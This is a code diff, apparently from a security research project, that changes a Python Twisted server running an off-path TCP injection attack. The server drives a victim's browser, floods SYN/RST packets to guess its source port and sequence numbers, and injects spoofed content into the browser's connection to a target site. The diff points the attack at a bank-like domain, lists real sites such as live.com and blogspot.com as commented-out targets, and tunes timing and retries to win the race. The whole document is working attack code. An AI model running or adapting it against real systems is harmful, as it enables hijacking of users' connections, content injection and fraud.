@@ -83,9 +83,20 @@ TEST_VICTIM_IP = '12.168.1.113'
 #VICTIM_SITE = '184.169.195.56'
 VICTIM_SITE = '50.18.143.83'
 VICTIM_DOMAIN = 'bank.hobocomp.com'
-VICTIM_SITE_IPS = ['50.18.143.83', '184.169.195.56']
+#VICTIM_SITE_IPS = ['50.18.143.83', '184.169.195.56']
 
-NEW_CONNECTION_PERIOD = 0.01
+
+#VICTIM_SITE = '65.55.206.154'
+#VICTIM_DOMAIN = 'live.com'
+
+#VICTIM_SITE='74.125.142.191'
+#VICTIM_DOMAIN='blogspot.com'
+
+#VICTIM_SITE='89.238.130.247'
+#VICTIM_DOMAIN='putlocker.com'
+
+
+NEW_CONNECTION_PERIOD = 0.005
 CONNECTION_TIMEOUT = 30.0
 SPEW_DELAY_US = '100'
 SPEW_TIME_MS  = '500'   # if you don't win the race in the first few seconds, you're not going to
@@ -127,7 +138,9 @@ class ControlWebSocket(Protocol):
         #self.addr.host = TEST_VICTIM_IP
         #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
         #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
-        guess_ip = VICTIM_SITE_IPS[self.ip_guess_index]
+        #guess_ip = VICTIM_SITE_IPS[self.ip_guess_index]
+        guess_ip = VICTIM_SITE
+        
         (port_a, port_b) = (low_port, high_port)
         if len(self.votes) > 0:
             (port_b, port_a) = (low_port, high_port)
@@ -183,7 +196,7 @@ class ControlWebSocket(Protocol):
         self.transport.write('iframe')
         if (self.spewer_pid == None):
             self.spawnHTTPSpewer() 
-        if (time.time() - self.last_init_iframe) < 60:
+        if (time.time() - self.last_init_iframe) < 15:
             reactor.callLater(float(self.RTT*2.5)/1000, self.make_iframe)
         else:
             # reset the whole thing, try again
@@ -192,6 +205,8 @@ class ControlWebSocket(Protocol):
             self.state = STATE_SOURCE_PORT_GUESS
             self.seq_spew_port = None
             self.killSpewer()
+            self.num_tries += 1
+            self.transport.write("tries %d" % self.num_tries)
 
             reactor.callLater(1, self.fireAgain)
 
@@ -233,8 +248,8 @@ class ControlWebSocket(Protocol):
                     self.mid_port = int(self.min_port) + 20
                 return
 
-            print 'Found port %d used for %s' % (port, VICTIM_SITE_IPS[self.ip_guess_index])
-            self.transport.write("Found port <b>%d</b> for %s" % (port, VICTIM_SITE_IPS[self.ip_guess_index])) 
+            print 'Found port %d used for %s' % (port + 1, VICTIM_SITE)
+            self.transport.write("Found port <b>%d</b> for %s" % (port + 1, VICTIM_SITE)) 
 
             self.seq_spew_port = port + 1
             reactor.callLater(0.5, self.init_iframe)
@@ -324,7 +339,7 @@ class ControlWebSocket(Protocol):
         if self.bucket_search:
             (self.min_port, self.mid_port) = self.getBucketPortRange()
         
-        print 'firing %d-%d (%d)' % (self.min_port, self.mid_port, self.max_port)
+        #print 'firing %d-%d (%d)' % (self.min_port, self.mid_port, self.max_port)
 
         self.spawnSpewer(self.min_port, self.mid_port)
 
@@ -332,7 +347,7 @@ class ControlWebSocket(Protocol):
         if self.bucket_search:
             testing = "(bucket) testing"
         self.transport.write("show <b>%s %s:%d - %d...</b>" % \
-            (testing, VICTIM_SITE_IPS[self.ip_guess_index], self.min_port, self.mid_port))
+            (testing, VICTIM_SITE, self.min_port, self.mid_port))
         self.transport.write("make ws://%s/" % (url))
         #self.transport.write("img %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy.
 
@@ -461,6 +476,9 @@ class ControlWebSocket(Protocol):
         pps /= 2 # have to send both SYN and RST
 
 
+        self.transport.write('bwres <b>%f mbps<br/>~= %f kpkts/sec<br/>~= %s us packet delay</b>' % \
+            ((bw/float(1024*1024)), (pps/float(1000)), self.SPEW_DELAY_US))
+
         port_guesses = float(pps * self.RTT) / 1000.0   # number of ports we can guess per RTT
 
         port_guesses *= 0.8  # fudge factor
@@ -500,6 +518,7 @@ class ControlWebSocket(Protocol):
     def connectionMade(self):
         self.bucket_search = True
         self.bucket = 0
+        self.num_tries = 0
         
         # Tell that browser to open a connection to get rid of the "Chrome opens 5-50 connections
         # for whatever reason when first asked, then calms down and only opens 1
@@ -507,5 +526,5 @@ class ControlWebSocket(Protocol):
         self.fire_time = time.time()
         self.state = STATE_INIT
         self.ip_guess_index = 0  # index into VICTIM_SITE_IPS[]
-        self.transport.write("calm ws://%s/" % (VICTIM_SITE_IPS[self.ip_guess_index])) 
+        self.transport.write("calm ws://%s/" % (VICTIM_SITE)) 
         #self.transport.write("calm %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy. 
